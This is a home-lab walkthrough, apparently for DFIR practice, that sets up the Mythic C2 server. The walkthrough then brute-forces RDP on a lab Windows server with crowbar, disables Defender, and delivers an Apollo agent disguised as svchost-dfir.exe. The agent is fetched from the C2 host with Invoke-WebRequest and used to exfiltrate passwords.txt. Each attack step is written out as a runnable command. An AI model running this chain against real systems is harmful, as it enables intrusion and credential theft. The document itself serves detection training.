# 3.0. Mythic C2 Setup, Payload Delivery, and Data Exfil

## Server Deployment

3.0. Deploy an Ubuntu 22.04 server with at least 2 CPUs, 4 GB of RAM, and 80 GB of Storage

3.1. Open Kali Linux in any hypervisor

3.2. SSH into the Mythic server and update the server

```powershell
apt-get update && apt-get upgrade -y
```

3.3. Install **docker compose**

```powershell
apt install docker-compose
```

3.4. Install **make**

```powershell
apt install make
```

3.5. Clone the **Mythic Repository** from Github

```powershell
git clone https://github.com/its-a-feature/Mythic
```

![Screenshot_(907)](https://github.com/user-attachments/assets/e9ef33a5-e3b5-4a8e-9a2c-b34de6f2752f)

3.6. cd into the Mythic directory and the binary of interest is  **install_docker_ubuntu.sh**

[]()

3.7. Invoke the binary

```powershell
./install_docker_ubuntu.sh
```

3.8. Ensure to still be under the Mythic directory. Check to see if **docker** is running, if not, restart docker as well as running the command, **make**

- Once completed, the mythic setup will be completed and the CLI will be able to be accessed

```powershell
systemctl status docker
systemctl restart docker
make

```

![Screenshot_(908)](https://github.com/user-attachments/assets/8b2e410d-9449-408d-be2b-063963cef6dc)

![Screenshot_(909)](https://github.com/user-attachments/assets/aab62ded-4504-4101-a8d1-54e8f8daf14c)

3.9. Run Mythic and access the CLI

```powershell
./mythic-cli start
```

3.1.0. Back in the CSP, create a firewall rule allowing all TCP traffic from the SSH Server, Windows Server, and your computer. Then attach that firewall group to the Mythic Server

![Screenshot_(910)](https://github.com/user-attachments/assets/15f05922-724b-4bcf-95dd-4aee896b9f4c)

[]()

3.1.1. Access the Mythic Web GUI which is the public IP of the Mythic server followed by the port number **7443**

- e.g. https://45.76.30.116 /7443

![Screenshot_(912)](https://github.com/user-attachments/assets/b242abba-8509-4806-ab02-8e485e069897)

3.1.2. To find the password of the default admin, it will be in the **hidden .env file** and the default admin username will be there as well. Login to the C2 GUI now

```powershell
cat .env
```

## Mythic Agent Deployment and Victim Data Exfiltration

### Phase 1

Phase 1 will include initiating a Brute Force attack from the Kali Linux Machine to the Windows Server

![Screenshot_(914)](https://github.com/user-attachments/assets/2cc3205e-17f9-4b54-8eef-8aff2d786f0b)

3.1.3. Create a **passwords.txt** file in the Windows Server. In the file input **Winter2024!**

![Screenshot_(915)](https://github.com/user-attachments/assets/1da3d0f8-ce97-4f55-a57b-f3213cca76f6)

3.1.4. Change the password of the local user to **Winter2024!**

3.1.5. Login to the Kali Machine. Create a wordlists from the **rockyou.txt** file and add in the **Winter2024!** password since this will be a proof of concept

```powershell
cd /usr/share/wordlists
head -50 > /home/kali/dfir-wordlist
nano dfir-wordlist
Winter2024!
```

![Screenshot_(916)](https://github.com/user-attachments/assets/2ec1b56a-9b15-4f5e-b82d-e636c51027dc)

### Windows Server Brute Force

3.1.6. Download the brute forcing tool, **crowbar**

```powershell
sudo apt-get update && sudo apt-get upgrade -y
sudo apt-get install -y crowbar
```

3.1.7. Create a target.txt file containing the IP of the target Windows Machine

```powershell
nano target.txt
```

3.1.8. Using crowbar try to brute force the Window Server. It can be seen that crowbar successfully traversed the wordlist created and successfully attained the password for Administrator 

```powershell
crowbar -b rdp -u Administrator -C dfir-wordlist -s 216.128.147.170/32
```

![Screenshot_(920)](https://github.com/user-attachments/assets/0a3fd904-a6ce-4911-b7e3-9d1793d9efbd)

3.1.9. RDP into the Windows Server using the credentials attained by brute forcing with crowbar. Access has successfully been attained to the Windows Server with Admin privileges

```powershell
xfreerdp /u:Administrator /p:Winter2024! /v:216.128.147.170:3389
```

![Screenshot_(921)](https://github.com/user-attachments/assets/368ad1ee-e310-4ecd-a1f9-bb0c578f011a)

### Phase 2

![Screenshot_(922)](https://github.com/user-attachments/assets/fb8e4bc3-6eb9-48b8-bf29-39dc13b9b120)

3.2.0. Now on to the Discovery Phase where we can run some basic commands to further the attack and better understand the network

![Screenshot_(923)](https://github.com/user-attachments/assets/bf570e41-0dd8-4a7a-98c1-a5a38311443d)

### Phase 3

![Screenshot_(924)](https://github.com/user-attachments/assets/e5963f79-a787-4292-9367-7574793e936a)

3.2.1. Following Discovery would be to disable Defender or any Security Controls within the victim machine to broaden the attack surface or further an attack

![Screenshot_(925)](https://github.com/user-attachments/assets/9a9f45af-2893-467a-81b2-18cc4311caf3)

### Phase 4

![Screenshot_(926)](https://github.com/user-attachments/assets/1aace4c5-c461-4cea-aeab-1bb0181e4f0c)

***Note -** Any configuration for Mythic should be done in the **mythic cli**

3.2.2. In the Mythic Server access the Mythic cli

```powershell
./mythic-cli
```

3.2.3. An agent needs to be installed on the Windows Server that now has been accessed. The agent of interest provided by Mythic should be applicable to **Windows** mainly. The **Profile** (means of communication to the C2 server) should be taken into account as well

- e.g. http, tcp, discord, etc

![Screenshot_(927)](https://github.com/user-attachments/assets/36b636bf-0599-4f05-8c18-94dce78ab662)

3.2.4. **Apollo agent** will be used in this case, so back in the server, run the following to install Apollo on the Mythic Server first. Once installed on the Mythic Server, back in the Web GUI under the **Payload/C2 Services,** Apollo should now be visible

```powershell
./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```

![Screenshot_(928)](https://github.com/user-attachments/assets/27874f71-f803-49e9-bdd5-81e5fc7f3960)

![Screenshot_(929)](https://github.com/user-attachments/assets/9b0c7998-bfca-4aa2-ae35-53364951b5e0)

3.2.5. Next is to create a **C2 Profile.** To find a C2 Profile, Mythic provides some, so select the one best applicable in the situation. In this case, **http** profile will be used

![Screenshot_(930)](https://github.com/user-attachments/assets/df91a2d4-ef76-46b3-b3f1-9419c29b4e29)

3.2.6. Back in the Mythic Server, begin the installation of the **http profile.** Once installed, both **Apollo** and **http** should be visible in the Mythic Web GUI

```powershell
./mythic-cli install github https://github.com/MythicC2Profiles/http
```

![Screenshot_(931)](https://github.com/user-attachments/assets/170cbb47-15aa-47bb-bf46-31f96a8458f0)

![Screenshot_(932)](https://github.com/user-attachments/assets/465b2c31-89a3-4715-b1fa-9b68916dbfe5)

3.2.7. In the **Payload** tab of the Web GUI, select **Generate New Payload,** choose Windows as the target, then under **Select Target Payload Type,** choose **WinExe**

![Screenshot_(933)](https://github.com/user-attachments/assets/90b5cb05-56fa-45e9-8434-cf48e03efb76)

![Screenshot_(934)](https://github.com/user-attachments/assets/ddefb6ea-cc7f-40b4-aae8-4a921a20f0cf)

![Screenshot_(935)](https://github.com/user-attachments/assets/97b2b36e-e408-4555-a922-deb7f0e9a299)

3.2.8. Under the **Select Commands** section, for this instance choose all (**>>)** commands in order to see what traffic and telemetry will look like

![Screenshot_(936)](https://github.com/user-attachments/assets/0d0d3591-2bde-4cb5-8d4f-89e19506ac87)

3.2.9. For **C2 Profiles,** select **http,** and the **callback host** should be the IP of the Mythic Server, since this is http, the format should be as followed: [http://45.76.30.116](http://45.76.30.116/), and port 80

![Screenshot_(937)](https://github.com/user-attachments/assets/48a5dde6-9b32-44dd-bc9d-454a3f643948)

3.3.0. In **Payload Review** section, name the payload now

![Screenshot_(938)](https://github.com/user-attachments/assets/636f8cda-ea55-48dd-80e2-cf7763bb1a75)

3.3.1. Once the payload has been successfully built, right click **Download** and select **Copy Link Address.** Save the Payload URL to a notepad

![Screenshot_(939)](https://github.com/user-attachments/assets/32d30d17-1881-466a-9069-5942024364fc)

![Screenshot_(940)](https://github.com/user-attachments/assets/3201be9b-12a3-4180-8f5b-4a5752db5cf6)

3.3.2. Back in the Mythic Server, change to the **/root directory.** and wget the payload using the link saved previously. The file will then be saved to the server. It can be seen that this file is  a PE32 executable

```powershell
cd ~ 
wget https://45.76.30.116:7443/direct/download/93ba273b-2654-4ef5-9dab-ad9c25cb1232 --no-check-certificate
```

![Screenshot (941).png](https://prod-files-secure.s3.us-west-2.amazonaws.com/246692bd-cf92-4f91-8b4e-6d4c15c8bf7a/d594b30d-ede7-473f-a856-7c7b5ef40728/Screenshot_(941).png)

![Screenshot (942).png](https://prod-files-secure.s3.us-west-2.amazonaws.com/246692bd-cf92-4f91-8b4e-6d4c15c8bf7a/7d327ee2-123a-4d4b-9501-26f4b339bd8e/Screenshot_(942).png)

3.3.3. To change the name run the following

```powershell
mv 93ba273b-2654-4ef5-9dab-ad9c25cb1232 svchost-dfir.exe
```

![Screenshot (943).png](https://prod-files-secure.s3.us-west-2.amazonaws.com/246692bd-cf92-4f91-8b4e-6d4c15c8bf7a/46e4ae9e-c78c-445c-ae34-60b4e1baea74/Screenshot_(943).png)

3.3.4. Create a directory and move the file into that directory 

```powershell
mkdir 1
mv svchost-dfir.exe 1/
cd 1 
ls
```

3.3.5. Use an http module by python to spin up a web server. Ensure the payload is in the directory and the command is being ran from that directory. Be sure the ufw is allowing traffic on port 9999 and 80 

```powershell
ufw allow 9999
ufw allow 80
python3 -m http.server 9999
```

3.3.6. Back in the Kali RDP instance, run PowerShell and from there access the web server spun up on the Mythic Server. Once done successfully, the payload should now be on the Windows Server

```powershell
Invoke-WebRequest -Uri http://45.76.30.116:9999/svchost-dfir.exe -OutFile "C:\Users\Public\Downloads\svchost-dfir.exe"
```

![Screenshot_(944)](https://github.com/user-attachments/assets/99afc215-6577-4882-a1e8-fa44aa107744)

3.3.7. Run the payload on the Windows Server. And in the cmd prompt of the Windows Server check if the connection is **established** between the Windows/Mythic Server

```powershell
.\svchost-dfir.exe

cmd prompt 
netstat -anob
```

![Screenshot_(945)](https://github.com/user-attachments/assets/2250ea50-82ae-478c-bdff-fea23dc54e9a)

3.3.8. The Process ID should match up which can be seen in netstat, task manager, and Mythic GUI

![Screenshot_(947)](https://github.com/user-attachments/assets/cd404d2c-ec4d-4851-b947-9fd044900546)

![Screenshot_(948)](https://github.com/user-attachments/assets/bc49a3ba-06e5-4d50-8363-2ab639de7f83)

![Screenshot_(949)](https://github.com/user-attachments/assets/d73b4a34-efc8-4872-b092-9ce9c1ed0d7a)

3.3.9. Now in the Mythic GUI, under the **Callback** tab, select the task number and the **Keyboard.** Doing so, commands can now be issued to the agent from the Web GUI and ran on the Windows Server

![Screenshot_(950)](https://github.com/user-attachments/assets/4915d006-32de-4881-b568-ce0613771711)

3.4.0. From the Mythic GUI, download the passwords.txt file from the Windows Server. Once the file has been downloaded, the message will turn **green** and show a preview of the file**.** The downloaded file and its contents can then be found in the **Files** tab 

```powershell
download C:\Users\Administrator\Documents\passwords.txt
```

![Screenshot_(951)](https://github.com/user-attachments/assets/8fcf4a05-d60e-4c06-b74e-bd448fe14cae)

![Screenshot_(952)](https://github.com/user-attachments/assets/fabd5166-1c39-49b9-9310-abe89f8543c5)

![Screenshot_(953)](https://github.com/user-attachments/assets/9b5cfcce-16be-47bd-82c0-032f72d22928)
